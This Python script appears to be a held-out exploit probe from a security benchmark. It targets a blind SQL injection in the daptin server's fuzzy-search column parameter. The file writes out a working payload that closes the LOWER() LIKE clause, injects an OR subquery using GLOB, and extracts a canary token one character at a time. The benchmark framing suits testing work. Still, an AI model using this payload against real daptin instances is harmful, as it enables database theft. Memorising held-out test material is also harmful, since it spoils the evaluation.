#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-44349 residual -- fuzzy-search column SQLi.

After v0.11.4 fixed the /aggregate column injection (CVE-2026-41422),
the processFuzzySearch function in resource_findallpaginated.go still
passed user-supplied column names directly into goqu.L(fmt.Sprintf(
"LOWER(%s) LIKE ?", prefix+col)) without any column whitelist check.

The injection in the column name of a fuzzy search query allows boolean-
blind SQL injection: a correlated subquery in an OR condition controls
whether rows are returned (total>0 = TRUE, total=0 = FALSE). The canary
is extracted character-by-character via LIKE pattern comparison.

Contract: reaches canary on V1 (daptin v0.11.4, fuzzy path unpatched);
          BLOCKED on V2 (daptin v0.11.5, column whitelist added).
"""
from __future__ import annotations

# Printable ASCII chars to test (optimized order: hex digits first since
# the flag format is PCBFLAG_<hex>)
CHARSET = "0123456789abcdefPCBFLAG_ghijklmnopqrstuvwxyz"


def candidate() -> dict:
    """The request candidate descriptor for the fuzzy-search column SQLi."""
    return {
        "probe_id": "cve-2026-44349-fuzzy-column-sqli",
        "method": "GET",
        "endpoint": "api",
        "entity": "world",
        "injection_type": "boolean-blind",
        "note": "Column parameter injected into LOWER(%s) LIKE ? expression; "
                "blind extraction via row-count differential.",
    }


def make_blind_query(table: str, column: str, prefix_so_far: str, test_char: str) -> dict:
    """Build a fuzzy-search query whose result total reveals whether
    the value in ``table.column`` starts with ``prefix_so_far + test_char``.

    The injection column closes the LOWER() LIKE expression, adds an OR
    with a correlated subquery using GLOB (case-sensitive in SQLite,
    unlike LIKE which is case-insensitive), and reopens LOWER() for the
    trailing bound parameter placeholder.

    Avoids commas in the injection (processFuzzySearch splits on comma).
    """
    # GLOB uses * for multi-char wildcard (not %) and is case-sensitive.
    glob_pattern = (prefix_so_far + test_char).replace("[", "[[]").replace("*", "[*]").replace("?", "[?]") + "*"
    col_injection = (
        f"table_name) LIKE 'XYZNOEXIST' "
        f"OR (SELECT {column} FROM {table} ORDER BY id DESC LIMIT 1) GLOB '{glob_pattern}' "
        f"OR LOWER(table_name"
    )
    return {
        "column": col_injection,
        "operator": "fuzzy",
        "value": "XYZNOEXIST",
    }


if __name__ == "__main__":
    c = candidate()
    print(f"Probe: {c['probe_id']}")
    print(f"Injection type: {c['injection_type']}")
    example = make_blind_query("pcb_canary", "token", "PCBFLAG_", "a")
    print(f"Example query column: {example['column']}")
